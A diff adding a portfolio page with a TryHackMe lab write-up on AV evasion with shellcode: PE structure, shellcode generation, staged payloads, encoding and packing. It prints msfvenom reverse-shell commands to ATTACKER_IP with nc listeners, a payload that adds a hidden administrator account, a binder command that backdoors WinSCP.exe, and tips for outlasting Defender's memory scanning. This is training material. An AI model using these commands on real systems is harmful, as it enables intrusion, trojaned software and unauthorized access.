@@ -1,0 +1,422 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<meta
+			name="description"
+			content="HEXEN - Penetration Tester & Penetration Tester Portfolio"
+		/>
+		<title>HEXEN // CYBERPUNK PEN-TESTER PORTFOLIO</title>
+		<link rel="stylesheet" href="../assets/css/writeups.css" />
+	</head>
+
+	<body class="cyberpunk-body">
+		<!-- Matrix Rain Background -->
+		<div id="matrix-rain" class="matrix-rain"></div>
+
+		<!-- Grid Background -->
+		<div class="grid-bg fixed top-0 left-0 w-full h-full z-0"></div>
+
+		<!-- Scanlines -->
+		<div
+			class="scanlines fixed top-0 left-0 w-full h-full pointer-events-none z-0"
+		></div>
+
+		<!-- Navigation -->
+		<nav
+			class="cyber-nav fixed top-0 left-0 w-full z-50 bg-black bg-opacity-80 backdrop-blur-sm border-b border-neongreen"
+		>
+			<div class="container mx-auto px-4 py-3">
+				<div class="flex justify-between items-center">
+					<div class="cyber-logo">
+						<span
+							class="text-neongreen font-bold text-xl glitch-effect"
+							data-text="HEXEN"
+							>HEXEN</span
+						>
+						<span class="text-neonpink text-sm ml-2"
+							>// SECURITY_SPECIALIST</span
+						>
+					</div>
+
+					<!-- Desktop Menu -->
+					<div class="hidden md:flex space-x-6">
+						<a href="../" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+
+					<!-- Mobile Menu Button -->
+					<div class="md:hidden mt-4">
+						<button
+							id="mobile-menu-button"
+							type="button"
+							class="text-neongreen focus:outline-none"
+						>
+							<svg
+								class="h-6 w-6 transition-transform duration-300"
+								id="menu-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M4 6h16M4 12h16M4 18h16"
+								></path>
+							</svg>
+							<svg
+								class="h-6 w-6 transition-transform duration-300 hidden"
+								id="close-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M6 18L18 6M6 6l12 12"
+								></path>
+							</svg>
+						</button>
+					</div>
+				</div>
+
+				<!-- Mobile Menu (hidden by default) -->
+				<div
+					id="mobile-menu"
+					class="md:hidden mt-2 border-t border-neongreen border-opacity-30 transform origin-top transition-all duration-300 scale-y-0 opacity-0 max-h-0"
+				>
+					<div class="flex flex-col space-y-4">
+						<a href="../index.html" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+				</div>
+			</div>
+		</nav>
+
+		<main class="relative z-10 pt-20">
+			<section id="writeup-controls" class="px-6 pt-6 pb-2 text-center">
+  
+
+  <div id='tags-container'>
+    
+  </div>
+</section>
+
+
+<div class="series-nav">
+  <div class="series-nav-header">
+    <span class="series-label">TryHackMe Red Team Path</span>
+    <span class="series-module">Module: Host Evasions</span>
+    <span class="series-part">Part 16 / 18</span>
+  </div>
+  <div class="series-nav-dots"><span class="series-dot" title="Red Team Fundamentals (4 parts)"></span><span class="series-dot" title="Initial Access (4 parts)"></span><span class="series-dot" title="Post Compromise (3 parts)"></span><span class="series-dot active-module" title="Host Evasions (7 parts)"></span></div>
+  <div class="series-nav-links">
+    <a href="introduction_to_antivirus_writeup.html" class="series-nav-btn cyber-link">← introduction to antivirus</a>
+    <a href="../writeups.html" class="series-nav-btn cyber-link">↑ all writeups</a>
+    <a href="obfuscation_principles_writeup.html" class="series-nav-btn cyber-link">obfuscation principles →</a>
+  </div>
+</div>
+<!-- Writeup content -->
+<article class="markdown-body"><h1>AV Evasion - Shellcode</h1>
+<p><strong>PE Structure</strong>
+PE (Portable Executable), is a data structure that holds information necessary for files. It is a way to organize executable file code on a disk. Windows operating system components, such as Windows and DOS loaders, can load it into memory and execute it based on the parsed file information found in the PE.</p>
+<p>There are different types of data containers in the PE structure, each holding different data.
+**.text **stores the actual code of the program
+**.data **holds the initialized and defined variables
+<strong>.bss</strong> holds the uninitialized data (declared variables with no assigned values)
+<strong>.rdata</strong> contains the read-only data
+<strong>.edata:</strong> contains exportable objects and related table information
+<strong>.idata</strong> imported objects and related table information
+<strong>.reloc</strong> image relocation information
+**.rsrc **links external resources used by the program such as images, icons, embedded binaries, and manifest file, which has all information about program versions, authors, company, and copyright!
+When looking at the raw contents of a Portable Executable you immediately see a series of bytes that at first appear meaningless, but together they describe everything the Windows loader needs in order to take the file from disk and transform it into a running process in memory.</p>
+<p>The loader begins by parsing the headers, which include the DOS header, the Windows header, and the optional header.</p>
+<p>The DOS stub begins with the magic number “MZ” which signals that the file is an executable. From these headers the loader also learns about the target CPU architecture such as x86 or x64, the file’s creation timestamp, and other metadata. It then moves on to the section table where it finds details about how the executable’s code and data are split into sections, how many there are, and what their sizes and offsets are. At this point the loader maps the sections into memory according to the ImageBase, calculates relative virtual addresses to align everything properly, resolves imported DLLs and functions, and prepares the process’s memory space so that execution can begin. Finally, it jumps to the EntryPoint address defined in the header to transfer control to the program’s first instruction.</p>
+<p>PE as we said stands for <strong>Portable Executable</strong>.</p>
+<p>In the VM of this room, there is a tool called <strong>PE-Bear</strong> which is used to parse EXE files. It helps check the PE structure: Headers, Sections etc.</p>
+<p>PE-Bear provides a graphic user interface to show all relevant EXE details. To load an EXE file for analysis, we select <strong>File -&gt; Load PEs</strong>. Then, once the file is loaded, we can see all PE details.</p>
+<p>First, I load the <strong>thm-intro2PE.exe</strong> file<strong>What is the last 6 digits of the MD5 hash value of the file?</strong></p>
+<p>Answer: 530949</p>
+<p><strong>What is the Magic number value of the file (in Hex)?</strong></p>
+<p>Answer: 5A4D</p>
+<p><strong>What is the Entry Point value of the file?</strong>
+Answer: 12E4</p>
+<p><strong>How many Sections does the file have?</strong>
+Answer: 7</p>
+<p><strong>A custom section could be used to store extra data. Malware developers use this technique to create a new section that contains their malicious code and hijack the flow of the program to jump and execute the content of a new section. What is the name of the extra section?</strong></p>
+<p>.flag</p>
+<p>Also, the flag is in the picture too.</p>
+<p><strong>Introduction to Shellcode</strong>
+Shellcode is basically a set of crafted machine code instructions. They tell the vulnerable program to perform additional functions, which in most cases can be something like providing access to a system shell or creating a reverse shell.</p>
+<p>Then, the shellcode is injected into a process and executed by this vulnerable piece of software.
+It modifies the flow of the code to update registers and functions of the program, in order to also execute the attacker’s code.</p>
+<p><strong>Shellcode is generally written in assembly</strong> and** translated into hexadecimal operation codes**.</p>
+<p>One purpose of well-crafted shellcode is to evade AV software or security solutions. However, writing shellcode has some requirements beforehand, those being:- Decent understanding of x86 and x64 CPU architectures</p>
+<ul>
+<li>Assembly language</li>
+<li>Strong knowledge of programming languages like C</li>
+<li>Familiarity with Linux and Windows operating systems</li>
+</ul>
+<p><strong>Syscalls</strong>
+Another concept is <strong>syscalls</strong>.
+A syscall is the way in which a program requests the kernel to do something.
+Each operating system has a different calling convention regarding syscalls.
+For 64-bit Linux for example, you can call the needed functions from the kernel by setting up the following values:</p>
+<p>The <strong>rax</strong> register is used to indicate the function in the kernel we wish to call.
+Setting <strong>rax</strong> to <strong>0x1</strong> makes the kernel execute <strong>sys_write</strong>,
+and setting <strong>rax</strong> to <strong>0x3</strong> will make the kernel execute <strong>sys_exit</strong></p>
+<p>Each of the two functions require some parameters to work, which can be set through the <strong>rdi</strong>, <strong>rsi</strong> and** rdx** registers.
+A full list of available 64-bit Linux syscalls is available  here</p>
+<p>For <strong>sys_write</strong>, the first parameter sent through <strong>rdi</strong> is the file descriptor to write to.
+The second parameter in <strong>rsi</strong> is a pointer to the string we want to print,
+and the third in <strong>rdx</strong> is the size of the string to print.</p>
+<p>For <strong>sys_exit</strong>, rdi needs to be set to the exit code for the program.
+We will use code 0, which means the program exited successfully.</p>
+<p><strong>I shall now create a file called thm.asm with the code the room provides.</strong>
+I then compile and link the ASM code to create an x64 Linux executable file and then execute it as follows:
+(also notice the two files at the bottom)</p>
+<p>I used the <strong>nasm</strong> command to compile the asm file, specifying the <strong>-f elf64</strong> option to indicate we are compiling for 64-bit Linux.
+As a result, a <strong>.o file</strong> is obtained. It contains <strong>object code</strong>, which needs to be linked in order to be a working executable file.
+The <strong>ld</strong> command is used to link the object and obtain the final executable.</p>
+<p>The <strong>-o</strong> option is used to specify the name of the output executable file.</p>
+<p>Now that we have the compiled ASM program, we extract the shellcode with the <strong>objdump</strong> command by dumping the <strong>.text</strong> section of the compiled binary.</p>
+<p>I shall now extract the hex value from the above output using the <strong>objcopy</strong> command to dump the <strong>.text</strong> section into a new file called <strong>thm.text</strong> in a binary format:</p>
+<p>This text file now contains the shellcode in binary format, able to be used.
+We need to convert it into hex though.</p>
+<p>The <strong>xxd</strong> command has the <strong>-i</strong> option that will output the file into a C string directly:</p>
+<p>And with that, we have turned our ASM assembly into a formatted shellcode!
+We can then inject this shellcode into a C program and try to run it with the following commands:</p>
+<p>Then we modify it to get the flag in this section:</p>
+<p><strong>Generate Shellcode</strong>Here we will generate and execute shellcode using public tools like the Metasploit framework.</p>
+<p>Shellcodes can be created for a specific format in a specific language.</p>
+<p>If for example the dropper is an .exe file, and contains the shellcode sent to the victim, and is written in C, then we need to generate a shellcode format that works in C.</p>
+<p>Public tools make it easier to write shellcode. Public C2 frameworks for example offer their own shellcode generator compatible with the C2 platform.
+These have a tendency to be easily detected however since they are well-known to AV vendors.</p>
+<p>We will now use Msfvenom on the AttackBox to generate a shellcode that executes Windows files.
+We will be creating a shellcode that runs the <strong>calc.exe</strong> application.</p>
+<p><strong>Shellcode Injection</strong>
+Now, we continue using the generated shellcode and execute it on the operating system. We will put the shellcode in a file named <strong>calc.c</strong></p>
+<p>Then, we <strong>compile it as an exe file:</strong></p>
+<p>Now we transfer the exe file to the Windows machine to execute it, usin <strong>smbclient</strong> to access the SMB share on the THM AttackBox.</p>
+<p>And indeed, on the Windows machine, it opens calc.exe!</p>
+<p><strong>Generating Shellcode from EXE Files</strong></p>
+<p>Shellcode can also be stored in <strong>.bin</strong> files, which is a raw data format. In this case, we can get its’ shellcode using the <strong>xxd -i</strong> command.</p>
+<p>C2 commands provide shellcode as a raw binary file <strong>.bin</strong>. If this is the case, we can use the Linux system command <strong>xxd</strong> to get the hex representation of the binary file.
+To do so, we execute the following command: <strong>xxd -i</strong></p>
+<p>And then <strong>xxd</strong> on this file:</p>
+<p><strong>Staged Payloads</strong>
+Payloads are categorized as either <strong>staged</strong> or <strong>stageless</strong>.</p>
+<p><strong>Stageless Payloads</strong> embed the final shellcode directly into itself. It’s basically a packaged app that executes the shellcode in a single step process. What we did above was a stageless payload.</p>
+<p><strong>Staged Payloads</strong> work by using intermediary shellcodes that act as steps leading to the execution of a final shellcode. Each of these intermediary shellcodes is known as a <strong>stager</strong>, and its’ primary goal is to provide a means to retrieve the final shellcode and then execute it.</p>
+<p>While some may have more stages, usually this is a two stage payload, where:
+<strong>The first stage</strong> is a stub shellcode that connects back to the attacker’s machine to download the final shellcode to be executed.</p>
+<p>Once retrieved, the stage0 stub will inject the final shellcode somewhere in the memory of that payload’s process and then executes it.</p>
+<p><strong>Staged vs Stageless</strong>
+Stageless payloads have the advantage of:</p>
+<ul>
+<li>being self-sustaining and needing no external dependencies</li>
+<li>Executes without needing additional internet connections, helping with avoiding detection from IPS</li>
+<li>Good for attacking hosts with restricted network connectivity</li>
+</ul>
+<p>Staged payloads have the advantage of:</p>
+<ul>
+<li>Leaving a small footprint on disk, since initial payload only serves to download the actual shellcode</li>
+<li>The final shellcode is not embedded into the executable</li>
+<li>The final shellcode is loaded into memory and doesnt interact with the disk, which makes it less detectable</li>
+<li>The same dropper can be used for many shellcodes, as we can simply replace the final shellcode that gets served to the victim</li>
+</ul>
+<p><strong>Stagers in Metasploit</strong>
+Metasploit also offers this choice to create either a staged or stageless payload via msfvenom.</p>
+<p>They are only differentiated by a **_ **and **/ **symbol respectively:</p>
+<p><strong>windows/x64/shell_reverse_tcp</strong>      refers to a stageless payload
+**windows/x64/shell/reverse_tcp       **refers to a staged payload</p>
+<p>Other types of shells also follow this type of pattern.
+To use a stageless Meterpreter shell for example, we would use the **windows/x64/meterpreter_reverse_tcp **rather than the **windows/x64/meterpreter/reverse_tcp   **which would work as its’ staged counterpart.</p>
+<p><strong>Creating your own stager</strong>
+For this part, an already existing code snippet will be used:</p>
+<p>Lets analyze the code.</p>
+<p>The first part of the code will import some Windows API functions via P/Invoke.
+The functions we need are the following three from <strong>kernel32.dll:</strong></p>
+<p>These <strong>WinAPI Functions:</strong></p>
+<ol>
+<li><p><strong>VirtualAlloc()</strong>
+which allows us to reserve some memory to be used by our shellcode.</p>
+</li>
+<li><p><strong>CreateThread()</strong>
+Which creates a thread as part of the current process.</p>
+</li>
+<li><p><strong>WaitForSingleObject()</strong>
+Used for thread synchronization. It allows us to wait for a thread to finish before continuing.</p>
+</li>
+</ol>
+<p>The part of the code responsible for** importing these functions** is the following:
+The most significant part of our code will be in the <strong>Stager()</strong> function, where the stager logic will be implemented.
+The <strong>Stager</strong> function receives a URL from where the shellcode to be executed is then downloaded.</p>
+<p>The first part of the Stager() function will make a new <strong>WebClient()</strong> object that allows us to download the shellcode using web requests.</p>
+<p>Before making the actual request, we will overwrite the <strong>ServerCertificateValidationCallback</strong> method in charge of validating certificates when using HTTPS requests so that the WebClient doesn’t complain about self-signed or invalid certificates, which we will be using in the webserver hosting the payloads.</p>
+<p>After that, we will call the <strong>DownloadData()</strong> method to download the shellcode from the given URL and store it into the <strong>shellcode</strong> variable:
+Once the shellcode is downloaded and available in the <strong>shellcode</strong> variable, we’ll need to copy it into executable memory before running it.</p>
+<p>We use <strong>VirtualAlloc()</strong> to request a memory block from the OS.
+Notice that we request enough memory to allocate <strong>shellcode.Length</strong> bytes, and set the <strong>PAGE_EXECUTE_READWRITE</strong> flag, making the assigned memory executable, readable and writable.
+Once our executable memory block is reserved and assigned to the <strong>codeAddr</strong> variable, we use <strong>Marshal.Copy()</strong> to copy the contents of the <strong>shellcode</strong> variable in the <strong>codeAddr</strong> variable.</p>
+<p>We now have a copy of the shellcode allocated in a block of executable memory. We will use the <strong>CreateThread()</strong> function to spawn a new thread on the current process that will execute the shellcode.</p>
+<p>This code demonstrates executing shellcode in a new thread and ensuring the program waits for the shellcode to finish before exiting.
+The third parameter of <strong>CreateThread</strong> points to** codeAddr**, the memory address where shellcode is stored. This makes the thread start executing the shellcode as though it were a normal function. The fifth parameter is set to 0, so the thread starts immediately.
+After creating the thread, <strong>WaitForSingleObject()</strong> is called with the thread handle and <strong>0xFFFFFFFF</strong> (INFINITE). This forces the current program to wait until the shellcode thread finishes execution, preventing the program from closing too early.
+We will now compile the file “staged-payload.cs” located at C:\Tools\CS Tiles\StagedPayload.cs this way:**csc **<strong>staged-payload.cs</strong></p>
+<p><strong>(I copied the file to Desktop and renamed it)</strong></p>
+<p><strong>Using our stager to run a reverse shell</strong>
+Now that the payload is compiled, we need to setup a web server to host the final shellcode. The stager will connect to this server to retrieve the shellcode and execute it in the victim’s machine <strong>in-memory.</strong>
+We firstly generate a shellcode using the command:<strong>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b &#39;\x00\x0a\x0d&#39;</strong></p>
+<p>We are using the raw format for our shellcode, as the stager will directly load whatever it downloads into memory.</p>
+<p>Since we have a shellcode now, we will setup a simple HTTPS server. To do that, we first need to create a self-signed certificate with this command:<strong>openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes</strong></p>
+<p>Since we don’t need this SSL certificate to be valid, we can leave the input fields empty.</p>
+<p>Now, we spawn the HTTPS server using python3, in a custom file in the same directory as the shellcode.bin file:</p>
+<p>We then start the listener for the reverse shell:<strong>nc -lvnp 7474</strong></p>
+<p><strong>Introduction to Encoding and Encryption</strong></p>
+<p><strong>Encoding</strong> is the process of transforming data into a defined <strong>format</strong> according to an <strong>algorithm</strong>. It applies to <strong>videos</strong>, <strong>HTML</strong>, <strong>URLs</strong>, <strong>executables</strong>, and <strong>images</strong>, and is commonly used for <strong>compiling/execution</strong>, <strong>storage/transmission</strong>, and <strong>file conversion</strong>. In <strong>AV evasion</strong>, encoding can hide <strong>shellcode</strong> strings inside binaries, but by itself it isn’t enough because modern <strong>AV</strong> can <strong>decode</strong> and analyze the content. Layering multiple <strong>encoding algorithms</strong> can raise the bar, but your <strong>dropper</strong> must correctly <strong>decode</strong> them to restore the original data.
+<strong>Encryption</strong> is a security mechanism that prevents unauthorized access by converting <strong>plaintext</strong> into <strong>ciphertext</strong> using an <strong>algorithm</strong> and a <strong>key</strong>. Without the correct <strong>decryption key</strong>, the ciphertext remains unreadable. Encryption can use <strong>symmetric keys</strong> (shared) or <strong>asymmetric keys</strong> (<strong>public/private key pairs</strong>) and is widely used for <strong>secure storage</strong> and <strong>end-to-end communication</strong>.
+Understanding both <strong>encoding</strong> and <strong>encryption</strong> matters for <strong>evasion</strong> because unmodified <strong>shellcode</strong> from public tools is easily <strong>detected</strong>. Applying encoding and especially <strong>encrypting</strong> the shellcode (and even <strong>functions</strong> or <strong>variables</strong>) helps conceal it <strong>at runtime</strong>.</p>
+<p><strong>Shellcode Encoding and Encryption</strong>
+Public tools like <strong>Metasploit</strong> will provide encoding and encryption features by themselves.
+AV solutions take great measures to detect these payloads however and if we don’t modify these payloads ourselves, they will be detected on sight upon touching the victim’s disk.
+We will now generate a simple payload. Within msfvenom, let’s list all available encoders:<strong>msfvenom --list encoders | grep excellent</strong></p>
+<p>Then, we indicate the encoder that we want to use. In this case, we want to use the <strong>shigata_ga_nai</strong> encoder with the **-e **(encoder) switch, and then specify that we want to encode the payload three times with the <strong>-i</strong> (iterations) switch:</p>
+<p><strong>msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b ‘\x00’’ -i 3 -f csharp</strong></p>
+<p>As we said though, this payload gets instantly detected by Defender.</p>
+<p>If encoding doesnt work, we can always encrypt the payload. This should have a higher success rating, as it proves to be a harder task for the AV.</p>
+<p><strong>Encryption using MSFVenom</strong>
+Encrypted payloads are easily generated using msfvenom. The choices for encryption algorithms are a bit scarce though.
+We can use the following command to list available encryption algorithms though:</p>
+<p><strong>msfvenom --list encrypt</strong></p>
+<p>Now to build an XOR encrypted payload, we will need to specify a key. The command would be like this:
+<strong>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key “MyZekr3tKey</strong><em>” -o xored-revshell.exe</em>*</p>
+<p>We now visit the THM AV website at the IP provided,, then upload this xored-revshell.exe file.
+As we can see, it is nonetheless detected.</p>
+<p>So, now we will try to create a <strong>Custom Payload</strong>.
+We need to use our own encoding schemes so that the AV doesn’t know what to do when analyzing our payload. All we need to do is make the task confusing enough for the AV to analyze.</p>
+<p>For this task, we will take a simple reverse shell generated by msfvenom and use a combination of XOR and Base64 to bypass Defender.</p>
+<p>Let’s generate a reverse shell with msfvenom in CSharp format.
+<strong>msfvenom LHOST=ATTACKER_IP LPORT=433 -p windows/x64/shell_reverse_tcp -f csharp</strong></p>
+<p><strong>The Encoder</strong>
+Before building the actual payload, we will create a program that takes the shellcode we just created, and then encodes it in any way we would prefer.
+In this case, we will be XOR encrypting the payload with a custom key first, and then encoding it using base64.</p>
+<p>The complete code for the encoder:</p>
+<p>This code will generate an encoded payload that we will embed on the final payload. We <strong>need to replace the buf variable with the shellcode we generated using msfvenom.</strong></p>
+<p>To compile and execute the encoder, we use this specific command on the Windows machine:**Csc.exe **<strong>Encrypter.cs</strong></p>
+<p>Then, just run: <strong>.\Encrypter.exe</strong>
+<strong>Self-decoding Payload</strong>
+Now that our payload is encoded, we need to adjust the code so that it’s decoded before execution. In order to match the encoder, we will decode everything in the reverse order that it was encoded. We will first start by decoding the Base64 content and then continue by XORing the result with the same key used in the encoder. The full payload code (also known in the machine as EncStageless.cs) is this:</p>
+<pre><code>
+Now that we actually combine a number of techniques, the AV will not alert us of a potential danger, since it cannot directly analyze this combination of techniques.
+
+Now, we will go further and compile our payload with the command on the Windows machine:
+**csc.exe ****EncStageless.cs**
+
+Before running our payload, we will setup a **nc** listener.
+All we need to do now is run **nc -lvp 443** and we should receive a connection back.
+
+**Packers**
+One effective method to bypass **disk-based AV detection** is the use of a **packer**. A packer is software that takes a program as input and transforms its structure so that it appears different, while maintaining the same **functionality**. Packers serve two primary purposes: to **compress** programs and to **protect** them from **reverse engineering**. Developers often rely on packers to secure legitimate software, but they are equally popular in the malware world for **obfuscating malicious code**. Well-known packers include **UPX, MPRESS, and Themida**.
+The process of **packing an application** involves applying a **packing function** that obfuscates the original code in a reversible way. This ensures that the program still runs as intended once unpacked. Typically, a **stub** is embedded within the executable to serve as an **unpacker**, and the executable’s entry point is redirected to it. When executed, the unpacker first runs, reads the packed code, restores the **original code** into memory, and then hands execution over to it. This creates a scenario where the file stored on disk looks different from the original, but the program executes identically after unpacking.
+This technique makes it possible to evade **antivirus signature detection**. For example, a **reverse shell** executable that matches known AV signatures can be packed so that its disk representation no longer matches any signature, allowing it to bypass initial scans. However, AVs can still detect packed applications. This can happen because the unpacker stub itself may have a **known signature**, or because the program eventually **unpacks its code into memory**, where AVs with **in-memory scanning** capabilities can still recognize and block it.
+
+**Packing our shellcode**
+We can begin the process from a basic C# shellcode, which can also be found at
+“UnEncStagelessPayload.cs”
+
+First, the shellcode must be generated and placed inside the code:
+**C:\&gt; msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp**
+
+Once embedded in the **shellcode** variable, the payload is compiled with:
+
+** csc ****UnEncStagelessPayload.cs**
+
+When uploaded to the **THM Antivirus Check!**, this unprotected executable is flagged instantly. To bypass this, the payload is run through **ConfuserEx**, a .NET packer. The process involves selecting the desktop as the **base directory**, dragging the executable into the interface, applying a new **rule (&quot;true&quot;)**, enabling **compression**, and setting the preset to **Maximum**. After clicking **Protect!**, a new packed executable is produced. Uploading this packed payload often avoids immediate AV detection, and if executed with a listener such as:
+**nc -lvp 7478**
+
+a reverse shell should connect successfully.
+
+However, **in-memory scanning** becomes a challenge. When commands are executed, **Windows Defender** hooks into API calls like **CreateProcess()** and detects the payload, terminating the shell. To reduce detection, several strategies can be applied. One method is simply to **wait a few minutes** before sending commands, as AV solutions tend to stop scanning memory after a short period due to performance costs. Another is to use **smaller payloads**; for example, generating a command execution payload instead of a full reverse shell makes detection harder:
+**msfvenom -a x64 -p windows/x64/exec CMD=&quot;net user pwnd Password321 /add;net localgroup administrators pwnd /add&quot; -f csharp**
+
+Additionally, a **process-spawning trick** can be used: once inside the reverse shell, launch a new **cmd.exe.** The AV will kill the process associated with the payload but usually won’t terminate the newly spawned command shell.
+
+**Binders**
+A **binder** is not an AV bypass method but is highly relevant when distributing **malicious payloads** to end users. A binder merges two or more executables into one, disguising the payload inside a legitimate program so users believe they are launching trusted software. Technically, the binder injects the **shellcode** into the chosen program and ensures it executes alongside the legitimate process. One way is by modifying the **PE header entry point** to run the shellcode first, then redirect execution back to the real program, making the payload invisible to the user.
+With **msfvenom**, binders can be created directly. This tool injects the payload by spinning up a **new thread**, which allows the original program to continue functioning normally while the payload runs silently. This method has the added benefit of stability: if the payload crashes, the legitimate program still works. For instance, to backdoor **WinSCP.exe**, the following command can be used:
+**C:\&gt; msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7779 -f exe -o WinSCP-evil.exe**
+
+The resulting **WinSCP-evil.exe** will run the normal WinSCP application while simultaneously executing a **reverse_tcp meterpreter payload**. Before execution, a listener must be started to catch the shell:
+
+**nc -lvp 7779**
+
+Once executed, the attacker receives a reverse shell while the victim sees only the legitimate WinSCP running.
+However, binders do not inherently evade **antivirus detection**. Since the malicious payload is still present, the final bound executable will trigger the same **signatures** as the original payload. Thus, the main value of binders lies in **tricking users**, not bypassing AVs. For actual stealth, attackers often combine **encoders, crypters, or packers** with a binder. This way, the payload is hidden from signature-based scanners while remaining concealed inside a trusted application.
+
+**CHALLENGE SECTION**
+In this challenge, the goal was to confirm which **antivirus software** was running on the target VM, identify the **user account**, and retrieve the **flag** from the victim’s desktop.
+
+From the reverse shell obtained in Task 9, we are aware of the command **sc query windefend**
+Running it on the “av-victim” machine will bring out the process name, so we know that Windows Defender is indeed running on that machine.
+
+To find out the name of the user account on which we have access to, on the shell that we obtained on Task 9, we just run whoami, to see that the account is **av-victim**.
+
+Then, for the final flag, we perform “dir” to browse the content of the victim’s Destop, where a file called **flag.txt **is located. From there, we just do **“type flag.txt”** and receive the flag.
+</code></pre>
+</article>
+${series_nav}
+
+			<!-- Footer -->
+			<footer
+				class="cyber-footer py-12 bg-black border-t border-gray-800 mt-12"
+			>
+				<div class="container mx-auto px-4">
+					<div class="flex flex-col md:flex-row justify-between items-center">
+						<div class="mb-6 md:mb-0">
+							<h3 class="text-2xl font-bold mb-2 text-neongreen">HEXEN_SEC</h3>
+							<p class="text-sm text-gray-400 cyber-text">
+								Penetration Testing & Security Consulting
+							</p>
+						</div>
+						<div class="flex space-x-6">
+							<a
+								href="#"
+								class="hover:text-neongreen transition-colors cyber-link"
+								>Imprint</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonpink transition-colors cyber-link"
+								>Privacy</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonblue transition-colors cyber-link"
+								>Legal</a
+							>
+						</div>
+					</div>
+					<div
+						class="border-t border-gray-800 mt-8 pt-8 text-center text-sm text-gray-400"
+					>
+						<p class="cyber-text">
+							© 2025 HEXEN. All systems operational.
+							<span class="text-neongreen">//</span> Secure by design.
+						</p>
+					</div>
+				</div>
+			</footer>
+		</main>
+		<script type="module" src="../assets/js/menu.js" defer></script>
+	</body>
+</html>
